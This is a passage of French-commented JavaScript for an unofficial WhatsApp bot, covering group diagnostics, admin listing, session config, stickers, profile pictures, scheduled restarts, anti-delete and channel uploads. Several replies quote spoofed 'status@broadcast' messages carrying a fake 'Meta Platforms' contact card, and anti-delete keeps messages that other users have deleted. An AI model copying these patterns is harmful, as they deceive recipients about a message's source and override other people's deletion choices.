      await socket.sendMessage(from, { text: "❗ Cette commande doit idéalement être utilisée dans un groupe pour inspecter les metadata du groupe." }, { quoted: msg });
      break;
    }

    // Récupérer metadata complet
    const metadata = await socket.groupMetadata(from);
    // Participants bruts
    const participants = metadata?.participants || [];
    // Liste des admins (JID complet)
    const groupAdminsJid = participants.filter(p => p?.admin).map(p => p.id);
    // Liste des admins nettoyée (numéros)
    const groupAdminsNum = groupAdminsJid.map(j => (j || '').split('@')[0].split(':')[0]);
    // Détecter JID du bot (robuste)
    let botJid = null;
    if (socket.user) {
      if (socket.user.jid) botJid = socket.user.jid;
      else if (socket.user.id) botJid = socket.user.id.split(':')[0] + '@s.whatsapp.net';
    }
    if (!botJid) {
      const idPart = socket.user?.id ? socket.user.id.split(':')[0] : null;
      const maybe = participants.find(p => p.id && idPart && p.id.startsWith(idPart));
      if (maybe) botJid = maybe.id;
    }
    const botNum = botJid ? botJid.split('@')[0].split(':')[0] : '';

    // Construire un résumé lisible
    let text = `🔎 *TESTGRP — Diagnostic du groupe*\n\n`;
    text += `• *Groupe* : ${metadata?.subject || '—'}\n`;
    text += `• *GID* : ${from}\n`;
    text += `• *Description* : ${metadata?.desc || '—'}\n`;
    text += `• *Créateur* : ${metadata?.owner || '—'}\n`;
    text += `• *Taille* : ${participants.length} membres\n\n`;

    text += `👥 *Admins (JID complet)* :\n`;
    if (groupAdminsJid.length) groupAdminsJid.forEach((a, i) => { text += `${i+1}. ${a}\n`; });
    else text += `Aucun admin détecté\n`;
    text += `\n🔢 *Admins (numéros nettoyés)* :\n`;
    if (groupAdminsNum.length) text += groupAdminsNum.join(', ') + '\n'; else text += '—\n';

    text += `\n🤖 *Bot JID* : ${botJid || 'non détecté'}\n`;
    text += `🤖 *Bot numéro* : ${botNum || '—'}\n\n`;

    // Exemple de mapping participants -> rôle et format brut (limité à 50 pour éviter message trop long)
    text += `📋 *Aperçu participants (max 50)* :\n`;
    const sample = participants.slice(0, 50);
    sample.forEach((p, i) => {
      const id = p.id || '—';
      const num = id.split('@')[0].split(':')[0];
      const admin = p.admin || '—';
      const isSuper = admin === 'superadmin' ? ' (superadmin)' : '';
      text += `${i+1}. ${num} — admin: ${admin}${isSuper}\n`;
    });
    if (participants.length > 50) text += `... et ${participants.length - 50} autres\n`;

    // Envoyer résumé lisible
    await socket.sendMessage(from, { text }, { quoted: msg });

    // Envoyer dump JSON (pour debug détaillé) en fichier ou en message (ici on envoie en message texte si pas trop grand)
    const dump = {
      metadata,
      participantsCount: participants.length,
      groupAdminsJid,
      groupAdminsNum,
      botJid,
      botNum,
      rawSocketUser: socket.user || null
    };
    const dumpStr = JSON.stringify(dump, null, 2);

    if (dumpStr.length < 15000) {
      // envoie le JSON directement (pratique pour debug)
      await socket.sendMessage(from, { text: `\`\`\`json\n${dumpStr}\n\`\`\`` }, { quoted: msg });
    } else {
      // si trop long, log côté serveur et prévenir l'utilisateur
      console.log('[TESTGRP DUMP]', dump);
      await socket.sendMessage(from, { text: 'ℹ️ Dump trop volumineux pour l\'envoyer ici — vérifie les logs serveur.' }, { quoted: msg });
    }

  } catch (e) {
    console.error('[TESTGRP ERROR]', e);
    await socket.sendMessage(from, { text: `❌ Erreur lors du diagnostic : ${e.message || e}` }, { quoted: msg });
  }
  break;
}

case 'admininfo': {
  // Affiche la liste des admins (numéros) et le JID/numéro du bot, en réutilisant la logique de kickall
  if (!from.endsWith('@g.us')) {
    await socket.sendMessage(sender, { text: "❗ Cette commande doit être utilisée dans un groupe." }, { quoted: msg });
    break;
  }

  try {
    const metadata = await socket.groupMetadata(from);
    const participants = metadata.participants || [];
    const groupName = metadata.subject || "Sans nom";

    // Même logique que kickall pour détecter le bot et les admins
    const botNumber = socket.user.id.split(':')[0] + '@s.whatsapp.net';
    const groupAdmins = participants.filter(p => p.admin).map(p => p.id);

    // Construire la liste lisible des admins (numéros)
    let adminListText = `👥 *ADMINS DU GROUPE* — ${groupName}\n\n`;
    if (!groupAdmins.length) {
      adminListText += 'Aucun admin détecté.\n';
    } else {
      groupAdmins.forEach((admin, i) => {
        const num = admin.split('@')[0];
        adminListText += `${(i + 1).toString().padStart(2, '0')}. @${num}\n`;
      });
    }

    // Vérifier si le bot est admin
    const botIsAdmin = groupAdmins.includes(botNumber);

    // Ajouter info bot
    adminListText += `\n🤖 *Bot JID* : ${botNumber}\n`;
    adminListText += `🤖 *Bot admin ?* : ${botIsAdmin ? '✅ Oui' : '❌ Non'}`;

    // Préparer mentions : mentionner les admins (et le bot si présent dans la liste)
    const mentions = [...groupAdmins];
    if (botIsAdmin && !mentions.includes(botNumber)) mentions.push(botNumber);

    await socket.sendMessage(from, {
      text: adminListText,
      mentions
    }, { quoted: msg });

  } catch (e) {
    console.error('[ERROR admininfo]', e);
    await socket.sendMessage(sender, { text: `❌ Erreur lors de la récupération des infos admin.\n\n${e.message || e}` }, { quoted: msg });
  }
  break;
}
// ---------- MUTE ----------


/* setconfig <KEY> <VALUE> */
/* setconfig */
case 'setconfig': {
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  try {
    // permission : seul le propriétaire de la session (number) ou le bot owner peut modifier
    const senderNum = (nowsender || '').split('@')[0];
    const ownerNum = (config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');
    if (senderNum !== sanitized && senderNum !== ownerNum) {
      const meta = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_SETCONFIG_DENIED" },
        message: { contactMessage: { displayName: BOT_NAME_FANCY } }
      };
      await socket.sendMessage(sender, { text: '❌ Permission denied. Only the session owner or bot owner can change this session configuration.' }, { quoted: meta });
      break;
    }

    const key = (args[0] || '').trim();
    const rawValue = args.slice(1).join(' ').trim();

    if (!key || rawValue === '') {
      const meta = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_SETCONFIG_HELP" },
        message: { contactMessage: { displayName: BOT_NAME_FANCY } }
      };
      return await socket.sendMessage(sender, { text: '❗ Usage: .setconfig <KEY> <VALUE>\nEx: .setconfig AUTO_VIEW_STATUS false\nPour voir les clés disponibles: .showconfig' }, { quoted: meta });
    }

    if (typeof ALLOWED_KEYS !== 'undefined' && Array.isArray(ALLOWED_KEYS) && !ALLOWED_KEYS.includes(key)) {
      return await socket.sendMessage(sender, { text: `❌ Clé non autorisée. Clés autorisées: ${ALLOWED_KEYS.join(', ')}` }, { quoted: msg });
    }

    const parsed = (typeof parseValueByType === 'function') ? parseValueByType(rawValue) : rawValue;

    let cfg = await loadUserConfigFromMongo(sanitized) || {};
    cfg = Object.assign({}, DEFAULT_SESSION_CONFIG || {}, cfg);
    cfg[key] = parsed;

    cfg._meta = cfg._meta || {};
    cfg._meta.updatedAt = new Date();
    cfg._meta.updatedBy = senderNum;
    cfg._meta.raw = rawValue;

    await setUserConfigInMongo(sanitized, cfg);

    const metaOk = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_SETCONFIG_OK" },
      message: { contactMessage: { displayName: cfg.botName || BOT_NAME_FANCY } }
    };
    await socket.sendMessage(sender, { text: `✅ Configuration mise à jour pour ${sanitized}\n• ${key} = ${formatValueForDisplay ? formatValueForDisplay(parsed) : String(parsed)}` }, { quoted: metaOk });

  } catch (e) {
    console.error('setconfig error', e);
    const metaErr = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_SETCONFIG_ERR" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY } }
    };
    await socket.sendMessage(sender, { text: `❌ Failed to set config: ${e.message || e}` }, { quoted: metaErr });
  }
  break;
}

/* getconfig */
case 'getconfig': {
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  try {
    const key = (args[0] || '').trim();
    if (!key) {
      const meta = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_GETCONFIG_HELP" },
        message: { contactMessage: { displayName: BOT_NAME_FANCY } }
      };
      return await socket.sendMessage(sender, { text: '❗ Usage: .getconfig <KEY>\nEx: .getconfig AUTO_VIEW_STATUS\nPour voir toutes les clés: .showconfig' }, { quoted: meta });
    }

    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || BOT_NAME_FANCY;
    const value = (cfg.hasOwnProperty(key)) ? cfg[key] : (DEFAULT_SESSION_CONFIG && DEFAULT_SESSION_CONFIG[key] !== undefined ? DEFAULT_SESSION_CONFIG[key] : undefined);

    const meta = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_GETCONFIG" },
      message: { contactMessage: { displayName: botName } }
    };

    if (typeof value === 'undefined') {
      await socket.sendMessage(sender, { text: `ℹ️ Clé introuvable: ${key}` }, { quoted: meta });
    } else {
      await socket.sendMessage(sender, { text: `🔎 ${key} = ${formatValueForDisplay ? formatValueForDisplay(value) : String(value)}` }, { quoted: meta });
    }

  } catch (e) {
    console.error('getconfig error', e);
    const metaErr = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_GETCONFIG_ERR" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY } }
    };
    await socket.sendMessage(sender, { text: '❌ Failed to load config.' }, { quoted: metaErr });
  }
  break;
}
/* resetconfig */
case 'resetconfig': {
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  try {
    const senderNum = (nowsender || '').split('@')[0];
    const ownerNum = (config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');
    if (senderNum !== sanitized && senderNum !== ownerNum) {
      const meta = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_RESET_DENIED" },
        message: { contactMessage: { displayName: BOT_NAME_FANCY } }
      };
      await socket.sendMessage(sender, { text: '❌ Permission denied. Only the session owner or bot owner can reset this session configuration.' }, { quoted: meta });
      break;
    }

    const cfg = Object.assign({}, DEFAULT_SESSION_CONFIG || {});
    cfg._meta = { updatedAt: new Date(), updatedBy: senderNum, raw: 'reset' };

    await setUserConfigInMongo(sanitized, cfg);

    const metaOk = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_RESET_OK" },
      message: { contactMessage: { displayName: cfg.botName || BOT_NAME_FANCY } }
    };
    await socket.sendMessage(sender, { text: `✅ Configuration de session ${sanitized} réinitialisée aux valeurs par défaut.` }, { quoted: metaOk });

  } catch (e) {
    console.error('resetconfig error', e);
    const metaErr = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_RESET_ERR" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY } }
    };
    await socket.sendMessage(sender, { text: '❌ Failed to reset config.' }, { quoted: metaErr });
  }
  break;
}

/* showconfig */
case 'showconfig2': {
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  try {
    const cfgRaw = await loadUserConfigFromMongo(sanitized) || {};
    const cfg = Object.assign({}, DEFAULT_SESSION_CONFIG || {}, cfgRaw);
    const botName = cfg.botName || BOT_NAME_FANCY;

    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_SHOWCONFIG"
      },
      message: {
        contactMessage: {
          displayName: botName,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD`
        }
      }
    };

    // Construire le texte de sortie
    const lines = [];
    lines.push(`📋 Configuration de session — ${sanitized}`);
    lines.push('');
    lines.push(`• Bot name: ${botName}`);
    lines.push(`• Logo: ${cfg.logo || config.RCD_IMAGE_PATH || 'aucun'}`);
    // Afficher les clés par défaut dans un ordre lisible
    for (const k of Object.keys(DEFAULT_SESSION_CONFIG || {})) {
      if (k === 'botName') continue; // déjà affiché
      const val = cfg.hasOwnProperty(k) ? cfg[k] : DEFAULT_SESSION_CONFIG[k];
      lines.push(`• ${k}: ${formatValueForDisplay ? formatValueForDisplay(val) : String(val)}`);
    }
    // Clés personnalisées
    const extraKeys = Object.keys(cfg).filter(k => !DEFAULT_SESSION_CONFIG.hasOwnProperty(k) && k !== '_meta');
    if (extraKeys.length) {
      lines.push('');
      lines.push('🔧 Clés personnalisées:');
      for (const k of extraKeys) {
        lines.push(`• ${k}: ${formatValueForDisplay ? formatValueForDisplay(cfg[k]) : String(cfg[k])}`);
      }
    }
    // Meta info
    if (cfg._meta) {
      lines.push('');
      lines.push(`Dernière mise à jour: ${cfg._meta.updatedAt || ''}`);
      lines.push(`Par: ${cfg._meta.updatedBy || ''}`);
    }

    await socket.sendMessage(sender, { text: lines.join('\n') }, { quoted: shonux });
  } catch (e) {
    console.error('showconfig error', e);
    const shonuxErr = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_SHOWCONFIG_ERR"
      },
      message: {
        contactMessage: {
          displayName: BOT_NAME_FANCY,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${BOT_NAME_FANCY};;;;\nFN:${BOT_NAME_FANCY}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD`
        }
      }
    };
    await socket.sendMessage(sender, { text: '❌ Failed to load config.' }, { quoted: shonuxErr });
  }
  break;
}


case 'sticker': {
  try {
    // parser args pour "auteur | titre"
    const raw = (args && args.join(' ')) || '';
    let author = '';
    let title = '';
    if (raw.includes('|')) {
      const parts = raw.split('|').map(p => p.trim());
      author = parts[0] || '';
      title = parts.slice(1).join(' | ') || '';
    } else if (raw.trim()) {
      title = raw.trim();
    }

    // Détection du message cité (même logique que dans tovn)
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;

    // Si pas de quoted, on tente de voir si le message courant contient un média
    const selfMedia = msg.message && (
      msg.message.imageMessage ||
      msg.message.videoMessage ||
      msg.message.documentMessage ||
      msg.message.stickerMessage
    ) ? msg.message : null;

    if (!quoted && !selfMedia) {
      await socket.sendMessage(sender, {
        text: '❗ Réponds à une image, GIF ou vidéo, ou envoie-en une avec la commande .sticker 𝐄𝐗𝐄𝐌𝐏𝐋𝐄 : .s mugiwara | it\'s me the best dev'
      }, { quoted: msg });
      break;
    }

    // Préparer un objet media compatible avec createStickerFromMedia: { buffer, mime, fileName? }
    let media = null;

    // Si quoted existe, déterminer le type (imageMessage, videoMessage, documentMessage, stickerMessage, etc.)
    if (quoted) {
      // quoted peut contenir imageMessage, videoMessage, documentMessage, stickerMessage, etc.
      const qTypes = ['imageMessage','videoMessage','audioMessage','documentMessage','stickerMessage','extendedTextMessage'];
      const qType = qTypes.find(t => quoted[t]);
      if (!qType) {
        await socket.sendMessage(sender, { text: '❌ Média cité non supporté.' }, { quoted: msg });
        break;
      }

      // Déterminer le message content (ex: quoted.imageMessage)
      const quotedContent = quoted[qType];

      // Télécharger via downloadContentFromMessage (Baileys)
      const messageType = qType.replace(/Message$/i, '').toLowerCase(); // 'image', 'video', 'document', 'sticker', ...
      const stream = await downloadContentFromMessage(quotedContent, messageType);
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      const buffer = Buffer.concat(chunks);

      media = {
        buffer,
        mime: quotedContent.mimetype || quotedContent.mimetype || '',
        caption: quotedContent.caption || quotedContent.fileName || '',
        fileName: quotedContent.fileName || ''
      };
    } else if (selfMedia) {
      // Si le message courant contient le média (non cité)
      const m = selfMedia.imageMessage || selfMedia.videoMessage || selfMedia.documentMessage || selfMedia.stickerMessage;
      const qType = selfMedia.imageMessage ? 'image' : selfMedia.videoMessage ? 'video' : selfMedia.documentMessage ? 'document' : 'sticker';
      const stream = await downloadContentFromMessage(m, qType);
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      const buffer = Buffer.concat(chunks);

      media = {
        buffer,
        mime: m.mimetype || '',
        caption: m.caption || m.fileName || '',
        fileName: m.fileName || ''
      };
    }

    if (!media || !media.buffer) {
      await socket.sendMessage(sender, { text: '❌ Impossible de télécharger le média cité.' }, { quoted: msg });
      break;
    }

    // Crée le sticker (statique ou animé selon le média)
    const { buffer: stickerBuffer } = await createStickerFromMedia(media, author, title);

    // Envoie le sticker
    await sendSticker(socket, sender, stickerBuffer, msg);

  } catch (err) {
    console.error('[STICKER ERROR]', err);
    await socket.sendMessage(sender, { text: `❌ Erreur lors de la création du sticker.\n${err.message || err}` }, { quoted: msg });
  }
  break;
}


case 'setpp': {
  try {
    // Résolution sécurisée du préfixe (variable peut être absente selon le contexte)
    const prefix = (typeof usedPrefix !== 'undefined' && usedPrefix)
                || (typeof prefix_used !== 'undefined' && prefix_used)
                || (typeof client?.prefix !== 'undefined' && client.prefix)
                || '.';

    // ── 1. Source média ────────────────────────────────────────────────────────
    const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const directMsg = msg.message?.imageMessage || msg.message?.documentMessage
                       ? msg.message : null;
    const target = quotedMsg || directMsg;

    if (!target) {
      await socket.sendMessage(
        sender,
        { text: `❗ Réponds à une image avec ${prefix}setpp` },
        { quoted: msg }
      );
      break;
    }

    // ── 2. Télécharger le média ────────────────────────────────────────────────
    const downloader = async (src, type) => {
      if (typeof downloadMediaMessage === 'function') {
        try { return await downloadMediaMessage(src, type); } catch (_) {}
      }
      const { downloadContentFromMessage } = require('@rexxhayanasi/elaina-bail');
      const stream = await downloadContentFromMessage(src, type);
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      return Buffer.concat(chunks);
    };

    const buffer = await robustDownload(target, downloader);
    if (!buffer?.length) throw new Error('Buffer vide — média invalide.');
    console.log('[SETPP] Buffer:', buffer.length, 'bytes');

    // ── 3. Résoudre le JID du bot ──────────────────────────────────────────────
    const botJid =
      socket?.user?.id                 ||
      socket?.userJid                  ||
      socket?.authState?.creds?.me?.id ||
      null;

    if (!botJid) throw new Error('JID du bot introuvable.');

    // ── 4. Mise à jour — elaina-bail fullpp en priorité ────────────────────────
    let updated = false;

    if (typeof socket.updateProfilePictureFull === 'function') {
      try {
        await socket.updateProfilePictureFull(botJid, buffer);
        updated = true;
        console.log('[SETPP] updateProfilePictureFull ✓');
      } catch (e) {
        console.warn('[SETPP] updateProfilePictureFull failed:', e?.message);
      }
    }

    if (!updated && typeof socket.updateProfilePicture === 'function') {
      try {
        await socket.updateProfilePicture(botJid, buffer, { fullPicture: true });
        updated = true;
        console.log('[SETPP] updateProfilePicture {fullPicture:true} ✓');
      } catch (e) {
        console.warn('[SETPP] updateProfilePicture+fullPicture failed:', e?.message);
        await socket.updateProfilePicture(botJid, buffer);
        updated = true;
        console.log('[SETPP] updateProfilePicture (standard) ✓');
      }
    }

    if (!updated) {
      if (typeof socket.query !== 'function') {
        throw new Error('Aucune méthode disponible pour mettre à jour la photo.');
      }
      await socket.query({
        tag: 'iq',
        attrs: { to: botJid, type: 'set', xmlns: 'w:profile:picture' },
        content: [{
          tag: 'picture',
          attrs: { type: 'image' },
          content: [
            { tag: 'image',   attrs: {}, content: buffer },
            { tag: 'preview', attrs: {}, content: buffer }
          ]
        }]
      });
      updated = true;
      console.log('[SETPP] IQ raw ✓');
    }

    await socket.sendMessage(
      sender,
      { text: '✅ Photo de profil mise à jour (full size) !' },
      { quoted: msg }
    );

  } catch (err) {
    console.error('[SETPP ERROR]', err);
    await socket.sendMessage(
      sender,
      { text: `❌ Échec du changement de photo.\n› ${err?.message ?? String(err)}` },
      { quoted: msg }
    );
  }
  break;
}
case 'sr': {
  if (!isOwner) {
    await socket.sendMessage(sender, { text: '❌ Owner only.' }, { quoted: msg });
    break;
  }

  const arg = (args[0] || '').toLowerCase();
  const minutes = parseInt(arg);

  if (!arg) {
    await socket.sendMessage(sender, {
      text: `⚙️ *SCHEDULE RESTART*\n\n` +
            `Usage: .sr [minutes]\n` +
            `Ex: .sr 60 → restart toutes les heures\n\n` +
            `Options:\n` +
            `.sr stop → arrêter\n` +
            `.sr now → restart maintenant\n` +
            `.sr status → voir état`
    }, { quoted: msg });
    break;
  }

  if (arg === 'stop') {
    if (global.restartTimer) {
      clearInterval(global.restartTimer);
      global.restartTimer = null;
    }
    await stopRestartSchedule();
    await socket.sendMessage(sender, { text: '✅ Schedule restart arrêté' }, { quoted: msg });
    break;
  }

  if (arg === 'now') {
    await socket.sendMessage(sender, { text: '🔄 Restarting...' }, { quoted: msg });
    setTimeout(() => process.exit(0), 2000);
    break;
  }

  if (arg === 'status') {
    const doc = await getRestartSchedule();
    if (doc && doc.active) {
      await socket.sendMessage(sender, {
        text: `✅ Schedule actif\nIntervalle: ${doc.minutes} minutes`
      }, { quoted: msg });
    } else {
      await socket.sendMessage(sender, { text: '❌ Aucun schedule actif' }, { quoted: msg });
    }
    break;
  }

  if (isNaN(minutes) || minutes < 1) {
    await socket.sendMessage(sender, { text: '❌ Spécifiez un nombre de minutes valide' }, { quoted: msg });
    break;
  }

  // Arrêter le précédent timer
  if (global.restartTimer) clearInterval(global.restartTimer);

  // Programmer le restart
  global.restartTimer = setInterval(() => {
    console.log(`🔄 Restart automatique (${minutes} minutes)`);
    process.exit(0);
  }, minutes * 60 * 1000);

  global.restartInterval = minutes;
  await setRestartSchedule(minutes);

  await socket.sendMessage(sender, {
    text: `✅ Restart programmé toutes les ${minutes} minutes`
  }, { quoted: msg });

  break;
}




  
 case 'antidelete':
case 'ad': {
  try {
    const sanitized = String(number || '').replace(/[^0-9]/g, '');
    const senderNum = (nowsender || '').split('@')[0];
    const ownerNum  = String(config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');

    if (senderNum !== sanitized && senderNum !== ownerNum) {
      await socket.sendMessage(sender, {
        text: `❌ Seul le propriétaire de la session peut modifier ce paramètre.`
      }, { quoted: msg });
      break;
    }

    let cfg = await loadUserConfigFromMongo(sanitized) || {};
    const sub = (args[0] || '').toLowerCase();

    if (sub === 'status') {
      const mode      = cfg.antidelete || 'off';
      const storeSize = getSessionStore(sanitized).size;
      const modeLabel = mode === 'all' ? '🌐 Tout (groupes + privé)'
                      : mode === 'g'   ? '👥 Groupes seulement'
                      : mode === 'p'   ? '💬 Privé seulement'
                      : '⛔ Désactivé';
      await socket.sendMessage(sender, {
        text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
              `┃  🗑️ *ANTIDELETE*\n` +
              `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
              `📊 *État :* ${modeLabel}\n` +
              `💾 *Store :* ${storeSize}/${STORE_MAX_PER_SESSION} msgs\n\n` +
              `━━━━━━━━━━━━━━━━━━\n` +
              `> ${config.BOT_FOOTER}`
      }, { quoted: msg });
      break;
    }

    if      (sub === 'off') { cfg.antidelete = 'off'; getSessionStore(sanitized).clear(); }
    else if (sub === 'g')   { cfg.antidelete = 'g';   }
    else if (sub === 'p')   { cfg.antidelete = 'p';   }
    else if (sub === 'all') { cfg.antidelete = 'all'; }
    else {
      await socket.sendMessage(sender, {
        text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
              `┃  🗑️ *ANTIDELETE*\n` +
              `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
              `*Commandes :*\n\n` +
              `  ${prefix}ad all → 🌐 Tout écouter\n` +
              `  ${prefix}ad g   → 👥 Groupes seulement\n` +
              `  ${prefix}ad p   → 💬 Privé seulement\n` +
              `  ${prefix}ad off → ⛔ Désactiver\n` +
              `  ${prefix}ad status → 📊 État\n\n` +
              `━━━━━━━━━━━━━━━━━━\n` +
              `> ${config.BOT_FOOTER}`
      }, { quoted: msg });
      break;
    }

    await setUserConfigInMongo(sanitized, cfg);

    const labels = {
      'all': '🌐 *Tout activé* — groupes + privé',
      'g'  : '👥 *Groupes seulement* activé',
      'p'  : '💬 *Privé seulement* activé',
      'off': '⛔ *Désactivé* — store vidé'
    };

    await socket.sendMessage(sender, {
      text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
            `┃  🗑️ *ANTIDELETE*\n` +
            `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
            `✅ ${labels[cfg.antidelete]}\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `> ${config.BOT_FOOTER}`
    }, { quoted: msg });

  } catch (e) {
    console.error('[ANTIDELETE ERROR]', e);
    await socket.sendMessage(sender, {
      text: `❌ Erreur : ${e.message || e}`
    }, { quoted: msg });
  }
  break;
}
              

            
            // ============ UPLOAD TO CHANNEL ============
            case 'upch': {
    const fs = require('fs');
    const path = require('path');
    
    // Chemin pour sauvegarder le JID du channel
    const cjidPath = path.join(__dirname, 'cjid.json');
    
    // Fonctions utilitaires
    function getChannelJid() {
        if (fs.existsSync(cjidPath)) {
            try {
                const data = JSON.parse(fs.readFileSync(cjidPath, 'utf-8'));
                return data.jid || null;
            } catch (e) { 
                console.error("[UPCH] Erreur lecture cjid:", e);
                return null; 
            }
        }
        return null;
    }
    
    function saveChannelJid(jid) {
        try {
            if (!fs.existsSync(path.dirname(cjidPath))) {
                fs.mkdirSync(path.dirname(cjidPath), { recursive: true });
            }
            fs.writeFileSync(cjidPath, JSON.stringify({ jid }, null, 2));
            return true;
        } catch (e) {
            console.error("[UPCH] Erreur sauvegarde cjid:", e);
            return false;
        }
    }
    
    // 1. Gestion du JID du channel
    const textInput = args.join(' ');
    
    if (textInput && textInput.includes('@newsletter')) {
        const newJid = textInput.trim();
        if (saveChannelJid(newJid)) {
            await socket.sendMessage(sender, { 
                text: `✅ *Channel Config*\n\nNouveau JID enregistré:\n${newJid}` 
            }, { quoted: msg });
        } else {
            await socket.sendMessage(sender, { 
                text: `❌ Échec de l'enregistrement du JID` 
            }, { quoted: msg });
        }
        break;
    }
    
    // 2. Vérifier si un JID existe
    let channelJid = getChannelJid();
    if (!channelJid) {
        await socket.sendMessage(sender, { 
            text: `📢 *Upload Channel*\n\n❌ Aucun JID de channel enregistré.\n\n📌 *Usage:*\n!${command} <jid_channel>\n\n*Exemple:*\n!${command} 120363025@newsletter` 
        }, { quoted: msg });
        break;
    }
    
    // 3. Vérifier le contenu à envoyer
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const contentText = textInput;
    
    if (!quoted && !contentText) {
        await socket.sendMessage(sender, { 
            text: `❌ Envoie un texte ou réponds à un média.` 
        }, { quoted: msg });
        break;
    }
    
    await socket.sendMessage(sender, { 
        react: { text: "📤", key: msg.key } 
    });

    try {
        if (quoted) {
            // Fonction pour télécharger avec la bonne méthode
            async function downloadMedia(mediaMessage) {
                const { downloadContentFromMessage } = require('@rexxhayanasi/elaina-baileys');
                
                let stream;
                if (mediaMessage.imageMessage) {
                    stream = await downloadContentFromMessage(mediaMessage.imageMessage, 'image');
                } else if (mediaMessage.videoMessage) {
                    stream = await downloadContentFromMessage(mediaMessage.videoMessage, 'video');
                } else if (mediaMessage.audioMessage) {
                    stream = await downloadContentFromMessage(mediaMessage.audioMessage, 'audio');
                } else if (mediaMessage.stickerMessage) {
                    stream = await downloadContentFromMessage(mediaMessage.stickerMessage, 'sticker');
                } else if (mediaMessage.documentMessage) {
                    stream = await downloadContentFromMessage(mediaMessage.documentMessage, 'document');
                } else {
                    throw new Error("Type de média non supporté");
                }
                
                const chunks = [];
                for await (const chunk of stream) {
                    chunks.push(chunk);
                }
                return Buffer.concat(chunks);
            }
            
            // Télécharger le média
            const mediaBuffer = await downloadMedia(quoted);
            
            if (!mediaBuffer || mediaBuffer.length === 0) {
                throw new Error("Échec du téléchargement");
            }
            
            // Déterminer le type et envoyer
            if (quoted.imageMessage) {
                await socket.sendMessage(channelJid, { 
                    image: mediaBuffer, 
                    caption: contentText || "" 
                });
                
            } else if (quoted.videoMessage) {
                await socket.sendMessage(channelJid, { 
                    video: mediaBuffer, 
                    caption: contentText || "" 
                });
                
            } else if (quoted.audioMessage) {
                // Envoyer audio tel quel (pas de conversion)
                await socket.sendMessage(channelJid, { 
                    audio: mediaBuffer,
                    mimetype: quoted.audioMessage.mimetype || 'audio/mp4',
                    ptt: quoted.audioMessage.ptt || false,
                    caption: contentText || ""
                });
                
            } else if (quoted.stickerMessage) {
                await socket.sendMessage(channelJid, { 
                    sticker: mediaBuffer 
                });
                
            } else if (quoted.documentMessage) {
                await socket.sendMessage(channelJid, { 
                    document: mediaBuffer,
                    fileName: quoted.documentMessage.fileName || "Document",
                    mimetype: quoted.documentMessage.mimetype || 'application/octet-stream'
                });
                
            } else {
                await socket.sendMessage(sender, { 
                    text: `❌ Type de média non supporté` 
                }, { quoted: msg });
                await socket.sendMessage(sender, { react: { text: "❓", key: msg.key } });
                break;
            }
            
        } else if (contentText) {
            // Envoyer du texte simple
            await socket.sendMessage(channelJid, { 
                text: contentText 
            });
        }
        
        // Attendre un peu et confirmer
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        await socket.sendMessage(sender, { 
            react: { text: "✅", key: msg.key } 
        });
        
        await socket.sendMessage(sender, { 
            text: `✅ *Channel Upload*\n\nContenu publié avec succès sur le channel !` 
        }, { quoted: msg });

    } catch (e) {
        console.error("[UPCH ERROR]:", e);
        await socket.sendMessage(sender, { 
            react: { text: "❌", key: msg.key } 
        });
        
        // Essayer une méthode alternative
        try {
            if (quoted) {
                // Forward simple comme fallback
                await socket.sendMessage(channelJid, {
                    forward: {
                        key: {
                            remoteJid: from,
                            fromMe: false,
                            id: msg.key.id
                        },
                        message: quoted
                    }
                });
                
                await socket.sendMessage(sender, { 
                    react: { text: "↩️", key: msg.key } 
                });
                
                await socket.sendMessage(sender, { 
                    text: `⚠️ Publié via forward (méthode alternative)` 
                }, { quoted: msg });
            }
        } catch (fallbackError) {
            console.error("[UPCH FALLBACK ERROR]:", fallbackError);
            await socket.sendMessage(sender, { 
